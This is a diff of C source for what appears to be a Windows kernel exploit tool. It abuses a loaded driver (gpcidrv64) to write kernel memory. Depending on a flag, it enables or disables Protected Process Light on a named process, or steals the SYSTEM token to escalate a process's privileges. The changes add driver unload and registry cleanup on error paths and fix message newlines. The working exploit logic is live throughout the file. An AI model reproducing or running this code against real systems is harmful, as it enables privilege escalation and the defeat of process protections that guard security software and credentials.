@@ -179,7 +179,7 @@ int main(int argc, char* argv[])
 
 	offset_check(); // Make sure we have the offsets for the thingy thing
 
-	printf("[+] Please make sure your version is detected correctly. Incorrect version detection will leads to BSOD. Submit bug to github if the version is detected incorrect.\n");
+	printf("[+] Please make sure your version is detected correctly. Incorrect version detection will leads to BSOD.\n");
 	printf("[+] Press any key to proceed.\n");
 	getchar();
 
@@ -211,9 +211,15 @@ int main(int argc, char* argv[])
 
 	if (!InitDriver()) {
 		printf("[-] Could not get a handle to driver, is driver loaded?\n");
+
+		if (bLoadDriver)
+		{
+			Dl_UnloadDriver(L"gpcidrv64");
+			Dl_RemoveDriverFromRegistry(L"gpcidrv64");
+		}
+
 		return 0;
 	}
-
 
 	DWORD proc_pid = GetProcId(ProcName);
 
@@ -221,6 +227,11 @@ int main(int argc, char* argv[])
 	{
 		printf("[-] Could not get PID of process %s.\n", ProcName);
 		CloseHandle(ghDriver);
+		if (bLoadDriver)
+		{
+			Dl_UnloadDriver(L"gpcidrv64");
+			Dl_RemoveDriverFromRegistry(L"gpcidrv64");
+		}
 		exit(0);
 	}
 
@@ -233,6 +244,11 @@ int main(int argc, char* argv[])
 	{
 		printf("[-] Could not find KPROCESS of process %s.\n", ProcName);
 		CloseHandle(ghDriver);
+		if (bLoadDriver)
+		{
+			Dl_UnloadDriver(L"gpcidrv64");
+			Dl_RemoveDriverFromRegistry(L"gpcidrv64");
+		}
 		exit(0);
 	}
 
@@ -243,7 +259,7 @@ int main(int argc, char* argv[])
 		BYTE data = 0x41;
 		printf("[+] Leaked %s EProcess: %p\n", ProcName, kprocess);
 		write_virtual_memory(ghDriver, pml4, kprocess + EPROCESS_PS_PROTECTION, &data, 1);
-		printf("[+] Hopefully %s now have PPL.", ProcName);
+		printf("[+] Hopefully %s now have PPL.\n", ProcName);
 	}
 	// Disable PPL
 	else if (bEnable == 0)
@@ -251,7 +267,7 @@ int main(int argc, char* argv[])
 		BYTE data = 0;
 		printf("[+] Leaked %s EProcess: %p\n", ProcName, kprocess);
 		write_virtual_memory(ghDriver, pml4, kprocess + EPROCESS_PS_PROTECTION, &data, 1);
-		printf("[+] Hopefully no more PPL");
+		printf("[+] Hopefully no more PPL\n");
 	}
 	// PrivEsc
 	else if (bEnable == 2)
@@ -264,6 +280,11 @@ int main(int argc, char* argv[])
 		{
 			printf("[-] Could not find KPROCESS of SYSTEM.\n");
 			CloseHandle(ghDriver);
+			if (bLoadDriver)
+			{
+				Dl_UnloadDriver(L"gpcidrv64");
+				Dl_RemoveDriverFromRegistry(L"gpcidrv64");
+			}
 			exit(0);
 		}
 
@@ -274,15 +295,27 @@ int main(int argc, char* argv[])
 		{
 			printf("[-] Could not find SYSTEM's token.\n");
 			CloseHandle(ghDriver);
+			if (bLoadDriver)
+			{
+				Dl_UnloadDriver(L"gpcidrv64");
+				Dl_RemoveDriverFromRegistry(L"gpcidrv64");
+			}
 			exit(0);
 		}
 
 		// Replace our process' token pointer with system's token pointer
 		write_virtual_memory(ghDriver, pml4, kprocess + EPROCESS_TOKEN, &system_token, sizeof uintptr_t);
 
-		printf("[+] Hopefully %s is now running as SYSTEM.", ProcName);
+		printf("[+] Hopefully %s is now running as SYSTEM.\n", ProcName);
 	}
 
 	CloseHandle(ghDriver);
+	if (bLoadDriver) 
+	{
+		Dl_UnloadDriver(L"gpcidrv64");
+		Dl_RemoveDriverFromRegistry(L"gpcidrv64");
+	}
+
+
 	return 0;
 }
